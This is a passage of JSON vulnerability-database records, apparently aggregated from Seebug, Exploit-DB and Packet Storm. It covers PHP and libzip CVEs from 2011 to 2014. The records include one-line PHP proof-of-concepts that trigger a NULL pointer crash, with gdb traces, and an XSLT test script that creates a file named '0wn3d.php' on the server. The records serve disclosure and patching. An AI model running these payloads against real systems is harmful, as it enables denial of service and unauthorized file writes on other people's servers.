            "description": "CVE ID: CVE-2011-0421\r\n\r\nlibzip\u662f\u8bfb\u53d6\u3001\u521b\u5efa\u548c\u4fee\u6539zip\u6587\u6863\u7684\u5e93\u3002\r\n\r\nlibzip 0.9.3 _zip_name_locate\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u7a7a\u6307\u9488\u5f15\u7528\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u8fdb\u884c\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n\u8bbe\u7f6eZIP_FL_UNCHANGED\u6807\u7b7e\u540e\uff0clibzip\u53ef\u4f7f\u8fdc\u7a0b\u548c\u672c\u5730\u653b\u51fb\u8005\u8fdb\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\u5bf9\u4e8e\u7a7azip\u6587\u4ef6\u548cZIP_FL_UNCHANGED\u65d7\u6807\uff0clibzip\u4f1a\u53d1\u751f\u5d29\u6e83\u3002\u76ee\u524d\u5bf9\u4e8ePHP\uff0c\u5b89\u5168\u5f71\u54cd\u53ea\u662f\u8fdc\u7a0b\u62d2\u7edd\u670d\u52a1\u3002\n\nPHP PHP 5.3.5\r\nlibzip libzip 0.9.3\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nlibzip\r\n------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c",
            "modified": "2011-03-22T00:00:00",
            "published": "2011-03-22T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20382",
            "id": "SSV:20382",
            "type": "seebug",
            "title": "libzip 0.9.3 _zip_name_locate\u7a7a\u6307\u9488\u5f15\u7528(incl PHP 5.3.5)",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20382"
        },
        {
            "bulletinFamily": "exploit",
            "description": "libzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5). CVE-2011-0421. Dos exploit for linux platform",
            "modified": "2011-03-18T00:00:00",
            "published": "2011-03-18T00:00:00",
            "id": "EDB-ID:17004",
            "href": "https://www.exploit-db.com/exploits/17004/",
            "type": "exploitdb",
            "title": "libzip 0.9.3 _zip_name_locate NULL Pointer Dereference incl PHP 5.3.5",
            "sourceData": "Source: http://securityreason.com/securityalert/8146\r\n\r\nlibzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5)\r\n\r\nAuthor: Maksymilian Arciemowicz\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\nDate:\r\n- Dis.: 03.01.2011\r\n- Pub.: 18.03.2011\r\n\r\nCVE: CVE-2011-0421\r\nCERT: VU#325039\r\n\r\nAffected Software:\r\n- libzip 0.9.3\r\n- PHP 5.3.5 (fixed 5.3.6)\r\n\r\nOriginal URL:\r\nhttp://securityreason.com/achievement_securityalert/96\r\n\r\n\r\n--- 0.Description ---\r\nlibzip is a C library for reading, creating, and modifying zip archives.\r\nFiles can be added from data buffers, files, or compressed data copied\r\ndirectly from other zip archives. Changes made without closing the archive\r\ncan be reverted. The API is documented by man pages.\r\n\r\n\r\n--- 1.Description ---\r\nlibzip allows remote and local attackers to Denial of Service (Null Pointer\r\nDereference) if ZIP_FL_UNCHANGED flag is set.\r\n\r\n-lib/zip_name_locate.c---\r\nint\r\n_zip_name_locate(struct zip *za, const char *fname, int flags,\r\nstruct zip_error *error)\r\n{\r\nint (*cmp)(const char *, const char *);\r\nconst char *fn, *p;\r\nint i, n;\r\n\r\nif (fname == NULL) {\r\n_zip_error_set(error, ZIP_ER_INVAL, 0);\r\nreturn -1;\r\n}\r\n\r\ncmp = (flags & ZIP_FL_NOCASE) ? strcasecmp : strcmp;\r\n\r\nn = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <=\r\nCRASH HERE\r\n-lib/zip_name_locate.c---\r\n\r\nfor empty zip file and ZIP_FL_UNCHANGED flag, libzip should crash.\r\nCurrently for PHP, the security impact we estimate only like a remote DoS,\r\nso risk is low. \r\n\r\nProject using libzip: KDE Utilities (4.x branch), MySQL Workbench, ckmame,\r\nfuse-zip, php zip extension, Endeavour2, FreeDink\r\n\r\nBetter analysis based on PHP code ZipArchive, bellow\r\n\r\n\r\n--- 2. PHP 5.3.5 ZipArchive() ---\r\nPoC1:\r\nphp -r '$nx=new\r\nZipArchive();$nx->open(\"/dev/null\");$nx->locateName(\"a\",ZIPARCHIVE::FL_UNCH\r\nANGED);'\r\n\r\nPoC2:\r\nphp -r '$nx=new\r\nZipArchive();$nx->open(\"empty.zip\");$nx->statName(\"a\",ZIPARCHIVE::FL_UNCHAN\r\nGED);'\r\n\r\nLet's\r\n-php_zip.c-------------------------------------\r\n...\r\nstatic ZIPARCHIVE_METHOD(locateName)\r\n{\r\n...\r\nZIP_FROM_OBJECT(intern, this);\r\n\r\nif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"s|l\",\r\n&name, &name_len, &flags) == FAILURE) {\r\nreturn;\r\n}\r\n...\r\nidx = (long)zip_name_locate(intern, (const char *)name, flags); <=== CRASH\r\nIN THIS FUNCTION\r\n...\r\n-php_zip.c-------------------------------------\r\n\r\nand let`s see\r\n\r\n-zip_name_locate.c-------------------------------------\r\nZIP_EXTERN(int)\r\nzip_name_locate(struct zip *za, const char *fname, int flags)\r\n{\r\nreturn _zip_name_locate(za, fname, flags, &za->error);\r\n}\r\n\r\n\r\nint\r\n_zip_name_locate(struct zip *za, const char *fname, int flags,\r\nstruct zip_error *error)\r\n{\r\nint (*cmp)(const char *, const char *);\r\nconst char *fn, *p;\r\nint i, n;\r\n\r\nif (fname == NULL) {\r\n_zip_error_set(error, ZIP_ER_INVAL, 0);\r\nreturn -1;\r\n}\r\n\r\ncmp = (flags & ZIP_FL_NOCASE) ? strcmpi : strcmp;\r\n\r\nn = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <===\r\nCRASH HERE IF ZIPARCHIVE::FL_UNCHANGED\r\nfor (i=0; i<n; i++) {\r\n...\r\n-zip_name_locate.c-------------------------------------\r\n\r\n(gdb) bt\r\n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x116ac70\r\n\"a\", flags=32767, \r\nerror=0xffffffff00000000) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n#1 0x00000000006381e6 in c_ziparchive_locateName (ht=2,\r\nreturn_value=0x1169418, return_value_ptr=0xffffffff, \r\nthis_ptr=0x118d530, return_value_used=-176126592) at\r\n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1877\r\n#2 0x00000000006e986a in zend_do_fcall_common_helper_SPEC\r\n(execute_data=0x7ffff7eb7068)\r\nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n#3 0x00000000006c0b00 in execute (op_array=0x1168568) at\r\n/build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:107\r\n...\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x1169400\r\n\"9223372036854775808\", flags=32767, \r\nerror=0xffffffff00000000) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n65 n = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry :\r\nza->nentry;\r\n(gdb) print za->cdir->nentry\r\nCannot access memory at address 0x8\r\n(gdb) print za->nentry\r\n$21 = 0\r\n\r\nbecause \r\n\r\n(gdb) x/i $rip\r\n=> 0x6407cc <_zip_name_locate+236>: mov 0x8(%rax),%eax\r\n(gdb) x/i $rax\r\n0x0: Cannot access memory at address 0x0\r\n(gdb) x/i $eax\r\n\r\ncall to zip_name_locate\r\n\r\n(gdb) n\r\n1877 idx = (long)zip_name_locate(intern, (const char *)name,\r\nflags);\r\n(gdb) print intern\r\n$24 = (struct zip *) 0x118d580\r\n(gdb) x/x intern\r\n0x118d580: 0x0118d220\r\n(gdb) x/40x intern\r\n0x118d580: 0x0118d220 0x00000000 0x0118d340 0x00000000\r\n0x118d590: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5a0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5b0: 0x00000000 0x00000000 0xffffffff 0x00000000\r\n0x118d5c0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5d0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5e0: 0x00000000 0x00000000 0x00020a21 0x00000000\r\n0x118d5f0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d600: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d610: 0x00000000 0x00000000 0x00000000 0x00000000\r\n\r\n\r\nnext PoC2\r\n\r\n$nx=new\r\nZipArchive();$nx->open(\"empty.zip\");$nx->statName(\"9223372036854775808\",\"92\r\n23372036854775807\");\r\nrogram received signal SIGSEGV, Segmentation fault.\r\n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0\r\n\"9223372036854775808\", flags=32767, \r\nerror=0xffffffffffffdac0) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n65 in /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c\r\n(gdb) bt\r\n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0\r\n\"9223372036854775808\", flags=32767, \r\nerror=0xffffffffffffdac0) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n#1 0x0000000000640a50 in zip_stat (za=0x118d520, fname=0x11693f0\r\n\"9223372036854775808\", flags=-1, \r\nst=0x7fffffffda70) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_stat.c:45\r\n#2 0x0000000000638451 in c_ziparchive_statName (ht=2,\r\nreturn_value=0x1169480, return_value_ptr=0xffffffff, \r\nthis_ptr=0x118d530, return_value_used=-176126592) at\r\n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1818\r\n#3 0x00000000006e986a in zend_do_fcall_common_helper_SPEC\r\n(execute_data=0x7ffff7eb7068)\r\nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n\r\n\r\n--- 3. Fix ---\r\nThis issue has been fixed with PHP Team, so big thanks guys.\r\n\r\nhttp://www.php.net/ChangeLog-5.php#5.3.6\r\n\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_name\r\n_locate.c?annotate=307867\r\n\r\n\r\n--- 4. Greets ---\r\nSpecial thanks for Pierre Joye and Stas\r\n\r\nsp3x, Infospec,\r\n\r\n\r\n--- 5. Contact ---\r\nAuthor: Maksymilian Arciemowicz\r\n\r\nEmail:\r\n- cxib {a\\./t] securityreason [d=t} com\r\n\r\nGPG:\r\n- http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\r\n\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17004"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-03-18T00:00:00",
            "published": "2011-03-18T00:00:00",
            "href": "https://packetstormsecurity.com/files/99445/libzip-0.9.3-NULL-Pointer-Dereference.html",
            "id": "PACKETSTORM:99445",
            "type": "packetstorm",
            "title": "libzip 0.9.3 NULL Pointer Dereference",
            "sourceData": "`   \nlibzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5)  \n  \nAuthor: Maksymilian Arciemowicz  \nhttp://securityreason.com/  \nhttp://cxib.net/  \nDate:  \n- Dis.: 03.01.2011  \n- Pub.: 18.03.2011  \n  \nCVE: CVE-2011-0421  \nCERT: VU#325039  \n  \nAffected Software:  \n- libzip 0.9.3  \n- PHP 5.3.5 (fixed 5.3.6)  \n  \nOriginal URL:  \nhttp://securityreason.com/achievement_securityalert/96  \n  \n  \n--- 0.Description ---  \nlibzip is a C library for reading, creating, and modifying zip archives.  \nFiles can be added from data buffers, files, or compressed data copied  \ndirectly from other zip archives. Changes made without closing the archive  \ncan be reverted. The API is documented by man pages.  \n  \n  \n--- 1.Description ---  \nlibzip allows remote and local attackers to Denial of Service (Null Pointer  \nDereference) if ZIP_FL_UNCHANGED flag is set.  \n  \n-lib/zip_name_locate.c---  \nint  \n_zip_name_locate(struct zip *za, const char *fname, int flags,  \nstruct zip_error *error)  \n{  \nint (*cmp)(const char *, const char *);  \nconst char *fn, *p;  \nint i, n;  \n  \nif (fname == NULL) {  \n_zip_error_set(error, ZIP_ER_INVAL, 0);  \nreturn -1;  \n}  \n  \ncmp = (flags & ZIP_FL_NOCASE) ? strcasecmp : strcmp;  \n  \nn = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <=  \nCRASH HERE  \n-lib/zip_name_locate.c---  \n  \nfor empty zip file and ZIP_FL_UNCHANGED flag, libzip should crash.  \nCurrently for PHP, the security impact we estimate only like a remote DoS,  \nso risk is low.  \n  \nProject using libzip: KDE Utilities (4.x branch), MySQL Workbench, ckmame,  \nfuse-zip, php zip extension, Endeavour2, FreeDink  \n  \nBetter analysis based on PHP code ZipArchive, bellow  \n  \n  \n--- 2. PHP 5.3.5 ZipArchive() ---  \nPoC1:  \nphp -r '$nx=new  \nZipArchive();$nx->open(\"/dev/null\");$nx->locateName(\"a\",ZIPARCHIVE::FL_UNCH  \nANGED);'  \n  \nPoC2:  \nphp -r '$nx=new  \nZipArchive();$nx->open(\"empty.zip\");$nx->statName(\"a\",ZIPARCHIVE::FL_UNCHAN  \nGED);'  \n  \nLet's  \n-php_zip.c-------------------------------------  \n...  \nstatic ZIPARCHIVE_METHOD(locateName)  \n{  \n...  \nZIP_FROM_OBJECT(intern, this);  \n  \nif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"s|l\",  \n&name, &name_len, &flags) == FAILURE) {  \nreturn;  \n}  \n...  \nidx = (long)zip_name_locate(intern, (const char *)name, flags); <=== CRASH  \nIN THIS FUNCTION  \n...  \n-php_zip.c-------------------------------------  \n  \nand let`s see  \n  \n-zip_name_locate.c-------------------------------------  \nZIP_EXTERN(int)  \nzip_name_locate(struct zip *za, const char *fname, int flags)  \n{  \nreturn _zip_name_locate(za, fname, flags, &za->error);  \n}  \n  \n  \nint  \n_zip_name_locate(struct zip *za, const char *fname, int flags,  \nstruct zip_error *error)  \n{  \nint (*cmp)(const char *, const char *);  \nconst char *fn, *p;  \nint i, n;  \n  \nif (fname == NULL) {  \n_zip_error_set(error, ZIP_ER_INVAL, 0);  \nreturn -1;  \n}  \n  \ncmp = (flags & ZIP_FL_NOCASE) ? strcmpi : strcmp;  \n  \nn = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <===  \nCRASH HERE IF ZIPARCHIVE::FL_UNCHANGED  \nfor (i=0; i<n; i++) {  \n...  \n-zip_name_locate.c-------------------------------------  \n  \n(gdb) bt  \n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x116ac70  \n\"a\", flags=32767,  \nerror=0xffffffff00000000) at  \n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65  \n#1 0x00000000006381e6 in c_ziparchive_locateName (ht=2,  \nreturn_value=0x1169418, return_value_ptr=0xffffffff,  \nthis_ptr=0x118d530, return_value_used=-176126592) at  \n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1877  \n#2 0x00000000006e986a in zend_do_fcall_common_helper_SPEC  \n(execute_data=0x7ffff7eb7068)  \nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316  \n#3 0x00000000006c0b00 in execute (op_array=0x1168568) at  \n/build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:107  \n...  \n  \nProgram received signal SIGSEGV, Segmentation fault.  \n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x1169400  \n\"9223372036854775808\", flags=32767,  \nerror=0xffffffff00000000) at  \n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65  \n65 n = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry :  \nza->nentry;  \n(gdb) print za->cdir->nentry  \nCannot access memory at address 0x8  \n(gdb) print za->nentry  \n$21 = 0  \n  \nbecause  \n  \n(gdb) x/i $rip  \n=> 0x6407cc <_zip_name_locate+236>: mov 0x8(%rax),%eax  \n(gdb) x/i $rax  \n0x0: Cannot access memory at address 0x0  \n(gdb) x/i $eax  \n  \ncall to zip_name_locate  \n  \n(gdb) n  \n1877 idx = (long)zip_name_locate(intern, (const char *)name,  \nflags);  \n(gdb) print intern  \n$24 = (struct zip *) 0x118d580  \n(gdb) x/x intern  \n0x118d580: 0x0118d220  \n(gdb) x/40x intern  \n0x118d580: 0x0118d220 0x00000000 0x0118d340 0x00000000  \n0x118d590: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d5a0: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d5b0: 0x00000000 0x00000000 0xffffffff 0x00000000  \n0x118d5c0: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d5d0: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d5e0: 0x00000000 0x00000000 0x00020a21 0x00000000  \n0x118d5f0: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d600: 0x00000000 0x00000000 0x00000000 0x00000000  \n0x118d610: 0x00000000 0x00000000 0x00000000 0x00000000  \n  \n  \nnext PoC2  \n  \n$nx=new  \nZipArchive();$nx->open(\"empty.zip\");$nx->statName(\"9223372036854775808\",\"92  \n23372036854775807\");  \nrogram received signal SIGSEGV, Segmentation fault.  \n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0  \n\"9223372036854775808\", flags=32767,  \nerror=0xffffffffffffdac0) at  \n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65  \n65 in /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c  \n(gdb) bt  \n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0  \n\"9223372036854775808\", flags=32767,  \nerror=0xffffffffffffdac0) at  \n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65  \n#1 0x0000000000640a50 in zip_stat (za=0x118d520, fname=0x11693f0  \n\"9223372036854775808\", flags=-1,  \nst=0x7fffffffda70) at  \n/build/buildd/php5-5.3.3/ext/zip/lib/zip_stat.c:45  \n#2 0x0000000000638451 in c_ziparchive_statName (ht=2,  \nreturn_value=0x1169480, return_value_ptr=0xffffffff,  \nthis_ptr=0x118d530, return_value_used=-176126592) at  \n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1818  \n#3 0x00000000006e986a in zend_do_fcall_common_helper_SPEC  \n(execute_data=0x7ffff7eb7068)  \nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316  \n  \n  \n--- 3. Fix ---  \nThis issue has been fixed with PHP Team, so big thanks guys.  \n  \nhttp://www.php.net/ChangeLog-5.php#5.3.6  \n  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_name  \n_locate.c?annotate=307867  \n  \n  \n--- 4. Greets ---  \nSpecial thanks for Pierre Joye and Stas  \n  \nsp3x, Infospec,  \n  \n  \n--- 5. Contact ---  \nAuthor: Maksymilian Arciemowicz  \n  \nEmail:  \n- cxib {a\\./t] securityreason [d=t} com  \n  \nGPG:  \n- http://securityreason.com/key/Arciemowicz.Maksymilian.gpg  \n  \nhttp://securityreason.com/  \nhttp://cxib.net/  \n  \n`\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:99445"
        }
    ],
    "CVE-2012-0057": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 51806\r\nCVE ID: CVE-2012-0057\r\n\r\nPHP\u662f\u4e00\u79cd\u5728\u7535\u8111\u4e0a\u8fd0\u884c\u7684\u811a\u672c\u8bed\u8a00\uff0c\u4e3b\u8981\u7528\u9014\u662f\u5728\u4e8e\u5904\u7406\u52a8\u6001\u7f51\u9875\uff0c\u5305\u542b\u4e86\u547d\u4ee4\u884c\u8fd0\u884c\u63a5\u53e3\u6216\u8005\u4ea7\u751f\u56fe\u5f62\u7528\u6237\u754c\u9762\u7a0b\u5e8f\u3002\r\n\r\nPHP\u5728libxslt\u5b89\u5168\u8bbe\u7f6e\u4e0a\u5b58\u5728\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u4f7f\u7528\u4e86libxslt\u8f93\u51fa\u6269\u5c55\u7684\u7279\u5236XSLT\u6837\u5f0f\u8868\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u3002\n0\nPHP 5.3.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-02-04T00:00:00",
            "published": "2012-02-04T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30080",
            "id": "SSV:30080",
            "type": "seebug",
            "title": "PHP 5.3.x libxslt\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 6.4,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30080"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2012-02-03T00:00:00",
            "published": "2012-02-03T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30072",
            "id": "SSV:30072",
            "type": "seebug",
            "title": "php: XSLT file writing vulnerability(CVE-2012-0057)",
            "sourceData": "\n                                                Description:\r\n------------\r\nCurrent version of PHP5 allow creation of arbitrary files when processing XSLT content. This was tested on the following releases :\r\n- PHP 5.3.2-1ubuntu4.7 with Suhosin-Patch (cli) (built: Jan 12 2011 18:36:08) \r\n- PHP 5.3.6 (cli) (built: Apr  1 2011 11:26:17)\r\n\r\nThe problem lies in the unrestricted use of libxslt. The attached patch will forbid some operations like the creation of files or directories, by calling the libxslt security API.\r\n\r\n\r\n\r\nTest script:\r\n---------------\r\n&lt;?php \r\n\r\n$sXml = '&lt;xml&gt;&lt;foo&gt;Hello from XML&lt;/foo&gt;&lt;/xml&gt;';\r\n \r\n$sXsl = &lt;&lt;&lt;EOT\r\n&lt;xsl:stylesheet version=&quot;1.0&quot;\r\n\txmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;\r\n\txmlns:sax=&quot;http://icl.com/saxon&quot;\r\n\textension-element-prefixes=&quot;sax&quot;&gt;\r\n\r\n\t&lt;xsl:template match=&quot;//foo&quot;&gt;\r\n\t\t&lt;sax:output href=&quot;0wn3d.php&quot; method=&quot;text&quot;&gt;\r\n\t\t\t&lt;xsl:value-of select=&quot;'0wn3d via PHP and libxslt ...'&quot;/&gt;\r\n\t\t\t&lt;xsl:apply-templates/&gt;\r\n\t\t&lt;/sax:output&gt;\r\n\t&lt;/xsl:template&gt;\r\n\r\n&lt;/xsl:stylesheet&gt;\r\nEOT;\r\n\r\n# LOAD XML FILE \r\n$XML = new DOMDocument(); \r\n$XML-&gt;loadXML( $sXml ); \r\n\r\n# LOAD XSLT FILE \r\n$XSL = new DOMDocument(); \r\n$XSL-&gt;loadXML( $sXsl );\r\n\r\n# START XSLT \r\n$xslt = new XSLTProcessor(); \r\n$xslt-&gt;importStylesheet( $XSL ); \r\n\r\n# TRASNFORM &amp; PRINT \r\nprint $xslt-&gt;transformToXML( $XML ); \r\n\r\n?&gt;\r\n\r\nExpected result:\r\n----------------\r\nFile isn't created and PHP displays some warnings :\r\n\r\nWarning: XSLTProcessor::transformToXml(): runtime error: file /somewhere/ line 7 element output in /somewhere/simple_xslt.php on line 34\r\nWarning: XSLTProcessor::transformToXml(): File write for 0wn3d.php refused in /somewhere/simple_xslt.php on line 34\r\nWarning: XSLTProcessor::transformToXml(): runtime error: file /somewhere/ line 7 element output in /somewhere/simple_xslt.php on line 34\r\nWarning: XSLTProcessor::transformToXml(): xsltDocumentElem: write rights for 0wn3d.php denied in /somewhere/simple_xslt.php on line 34\r\n\r\n\r\nActual result:\r\n--------------\r\nFile '0wn3d.php' is created\n                              ",
            "cvss": {
                "score": 6.4,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30072"
        }
    ],
    "CVE-2014-2497": [
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID: CVE-2014-2497\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\u3002\r\n\r\nPHP 5.4.26\u30015.5.10\u7248\u672c\u5728 &quot;gdImageCreateFromXpm()&quot; \u51fd\u6570 (ext/gd/libgd/gdxpm.c)\u7684\u5b9e\u73b0\u4e0a\u5b58\u5728\u7a7a\u6307\u9488\u95f4\u63a5\u5f15\u7528\u9519\u8bef\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5236\u7684XPM\u6587\u4ef6\uff0c\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u9020\u6210\u5d29\u6e83\u3002\n0\nPHP PHP 5.5.10\r\nPHP PHP 5.4.26\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.php.net/downloads.php\r\nhttps://bugs.php.net/bug.php?id=66901",
            "modified": "2014-03-19T00:00:00",
            "published": "2014-03-19T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61842",
            "id": "SSV:61842",
            "title": "PHP &quot;gdImageCreateFromXpm()&quot;\u7a7a\u6307\u9488\u95f4\u63a5\u5f15\u7528\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61842"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Bugtraq ID:66233\r\nCVE ID:CVE-2014-2497\r\n\r\nphp-gd\u662f\u4e00\u4e2a\u56fe\u7247\u5904\u7406\u6269\u5c55\u5e93\u3002\r\n\r\nphp-gd 'gdxpm.c'\u4e2d\u7684gdImageCreateFromXpm()\u51fd\u6570\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8c03\u7528strlen()\u89e3\u6790image.colorTable[i].c_color\u65f6\u5b58\u5728\u7a7a\u6307\u9488\u5f15\u7528\u9519\u8bef\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u4f7f\u94fe\u63a5\u6b64\u5e93\u7684\u5e94\u7528\u5d29\u6e83\u3002\n0\nphp-gd &lt;= v5.4.17-2\n\u76ee\u524d\u6ca1\u6709\u8be6\u7ec6\u89e3\u51b3\u65b9\u6848\u63d0\u4f9b\uff1a\r\nhttp://www.php.net/",
            "modified": "2014-03-17T00:00:00",
            "published": "2014-03-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61811",
            "id": "SSV:61811",
            "title": "php-gd 'gdxpm.c'\u7a7a\u6307\u9488\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
